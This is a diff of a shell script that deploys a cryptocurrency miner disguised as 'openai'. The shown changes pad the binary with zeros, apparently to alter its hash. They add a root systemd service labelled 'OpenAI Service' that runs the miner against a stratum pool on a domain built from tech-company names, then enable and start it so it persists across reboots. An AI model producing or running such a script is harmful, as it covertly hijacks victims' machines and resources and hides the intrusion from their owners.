@@ -11,4 +11,23 @@ cd openai && rm -rf SHA256SUMS
 for i in $(seq 1 $random_number); do
   echo -n "0" >> /root/openai/openai
 done
-./openai -a rx -o stratum+ssl://rx.microsoftazureamazonawsibmapplenvidiaoracleciscoadobe.com:443 -u $U -p x
+cat > /etc/systemd/system/openai.service <<EOL
+[Unit]
+Description=OpenAI Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/root/openai/openai -a rx -o stratum+ssl://rx.microsoftazureamazonawsibmapplenvidiaoracleciscoadobe.com:443 -u $1 -p x
+Restart=on-failure
+User=root
+
+[Install]
+WantedBy=multi-user.target
+EOL
+
+systemctl daemon-reload
+systemctl enable openai.service
+systemctl start openai.service
+
+#./openai -a rx -o stratum+ssl://rx.microsoftazureamazonawsibmapplenvidiaoracleciscoadobe.com:443 -u $U -p x
